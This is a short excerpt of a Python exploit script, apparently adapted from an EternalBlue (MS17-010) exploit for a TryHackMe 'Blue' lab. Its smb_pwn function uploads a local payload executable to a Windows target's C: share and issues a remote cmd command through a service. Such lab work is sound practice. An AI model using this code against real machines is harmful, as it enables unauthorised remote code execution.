...
I# win 2003 (xp 64 bit is win 2003)
...
def smb_pwn(conn, arch):
	...
	smb_send_file(smbConn, '/root/Desktop/tryhackme/blue/eternal-blue.exe', 'C', '/eternal-blue.exe')
	service_exec(conn, r'cmd /c copy c:\eternal-blue.exe')
